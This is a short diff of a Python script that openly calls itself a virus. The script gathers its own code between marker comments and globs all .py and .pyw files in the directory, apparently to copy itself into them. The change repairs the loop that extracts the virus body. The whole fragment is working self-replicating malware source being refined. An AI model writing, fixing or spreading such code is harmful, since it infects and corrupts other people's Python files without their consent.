@@ -18,8 +18,8 @@ for line in lines:
         self_replicating_part = True
     if not self_replicating_part:
         virus_code.append(line)
-        if line == "# VIRUS SAYS BYE!\n": 
-            break
+    if line == "# VIRUS SAYS BYE!\n": 
+        break
 python_files = glob.glob('*.py') + glob.glob('*.pyw')
 
 
